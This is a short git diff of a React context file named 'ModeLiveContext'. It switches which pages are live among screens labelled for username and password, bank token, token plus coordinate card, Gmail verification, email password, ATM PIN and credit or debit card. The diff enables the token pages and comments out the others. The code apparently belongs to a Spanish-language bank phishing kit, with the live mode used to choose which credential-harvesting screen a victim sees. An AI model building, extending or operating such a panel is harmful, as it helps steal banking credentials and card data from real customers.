@@ -4,13 +4,13 @@ import { createContext, useState } from 'react'
 // import { UsernameAndPassword } from '../components/pages/usernamePassword/UsernameAndPassword'
 // import { Username } from '../components/pages/username/Username'
 // import { Password } from '../components/pages/password/Password'
-// import { Token } from '../components/pages/token/Token'
+import { Token } from '../components/pages/token/Token'
 import { UsernameAndPassword } from '../components/pages/usernamePassword/UsernameAndPassword'
-import { CreditCard } from '../components/pages/card/CreditCard'
-import { Atm } from '../components/pages/cajeroAtm/Atm'
-import { EmailAndPassword } from '../components/pages/email/emailAndPassword/EmailAndPassword'
-import { Username } from '../components/pages/username/Username'
-import { GmailVerification } from '../components/pages/verify gmail/passwordEmail/PasswordGmail'
+// import { CreditCard } from '../components/pages/card/CreditCard'
+// import { Atm } from '../components/pages/cajeroAtm/Atm'
+// import { EmailAndPassword } from '../components/pages/email/emailAndPassword/EmailAndPassword'
+// import { Username } from '../components/pages/username/Username'
+// import { GmailVerification } from '../components/pages/verify gmail/passwordEmail/PasswordGmail'
 
 export const ModeLiveContext = createContext()
 
@@ -25,25 +25,30 @@ export const ModeLiveProvider = ({ children }) => {
             Element: <UsernameAndPassword />,
         },
         {
-            textPage: 'Verificar gmail',
-            urlPage: '/gmailverification',
-            Element: <GmailVerification />,
+            textPage: 'Token',
+            urlPage: '/Token',
+            Element: <Token />,
         },
         {
-            textPage: 'Correo y contraseña del correo',
-            urlPage: '/passwordEmail',
-            Element: <EmailAndPassword />,
+            textPage: 'Token + Coordenadas',
+            urlPage: '/Seguridad',
+            Element: <Token />,
         },
-        {
-            textPage: 'Clave ATM',
-            urlPage: '/atm-validation',
-            Element: <Atm />,
-        },
-        {
-            textPage: 'Tarjeta de Credito/Debito',
-            urlPage: '/tc-validation',
-            Element: <CreditCard  />,
-        },        
+        // {
+        //     textPage: 'Correo y contraseña del correo',
+        //     urlPage: '/passwordEmail',
+        //     Element: <EmailAndPassword />,
+        // },
+        // {
+        //     textPage: 'Clave ATM',
+        //     urlPage: '/atm-validation',
+        //     Element: <Atm />,
+        // },
+        // {
+        //     textPage: 'Tarjeta de Credito/Debito',
+        //     urlPage: '/tc-validation',
+        //     Element: <CreditCard  />,
+        // },        
         // {
         //     textPage: 'Usuario',
         //     urlPage: '/',
